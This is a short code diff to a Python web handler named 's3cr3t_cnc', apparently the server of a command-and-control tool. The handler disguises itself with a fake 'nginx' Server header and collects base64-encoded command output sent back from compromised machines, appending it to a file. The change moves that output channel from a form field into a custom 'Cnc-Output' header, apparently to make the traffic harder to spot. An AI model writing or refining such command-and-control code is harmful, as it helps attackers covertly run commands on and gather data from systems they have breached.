@@ -24,9 +24,9 @@ def s3cr3t_cnc():
     resp.headers.set('Server', 'nginx')
     if request.method == 'OPTIONS':
         # Get CNC results
-        foo = dict(request.form)
-        if foo.get('FOO', None) != None:
-            command_output = b64decode(foo['FOO'])
+        foo = dict(request.headers)
+        if foo.get('Cnc-Output', None) != None:
+            command_output = b64decode(foo['Cnc-Output'])
             command_output = b"\n\n\n\n\n\n"+command_output
             write_to_file(command_output_file, command_output, w_type="ab")
 
